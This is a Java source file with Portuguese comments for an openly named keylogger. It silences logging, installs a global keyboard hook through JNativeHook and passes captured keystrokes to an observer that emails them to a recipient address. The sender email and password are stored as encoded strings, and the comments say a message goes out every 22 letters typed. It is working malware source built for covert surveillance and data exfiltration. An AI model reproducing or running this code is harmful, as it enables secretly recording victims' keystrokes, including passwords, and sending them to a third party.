package br.com.keylogger;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Main {

	public static void main(String[] args) {
		
		/**
		 * Remover log desnecessario
		 */
		LogManager.getLogManager().reset();
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		
		/**
		 * Iniciar a "revista"(subject) e o "leitor"(envio)
		 * para o envio ter sucesso, é necessario a ativação
		 * do acesso para aplicativos menos seguros atraves do link abaixo
		 * http://www.google.com.br/settings/security/lesssecureapps
		 * 
		 * O apliativo esta programado para enviar uma mensagem a cada 22 letras digitadas.
		 * para mudar so ir na classe capture no método nativeKeyPressed
		 * e alterar o valor 22 no if para o que desejar.
		 */
		Subject captura = new Captura();
		Observer envio = new Envio(captura, 
				"FVAVFTXGAVDXAADDDVXGAAFFFTDD",	//EMIAL
				"FVFTAAXGFVAVDTDAAAXGAAFFFTDD",	//SENHA
				"destinatario@email.com");		//DESTINATARIO
		captura.addObserver(envio);
		//MenuGUI menu = new MenuGUI((Envio) envio, (Captura) captura);
		/**
		 * Registrar gancho para captura
		 */
		try {
			GlobalScreen.registerNativeHook();
		} catch(NativeHookException ex) {
			ex.printStackTrace();
		}
		
		/**
		 * Adicionar a classe de escuta
		 */
		GlobalScreen.addNativeKeyListener((Captura)captura);
		
	}

}
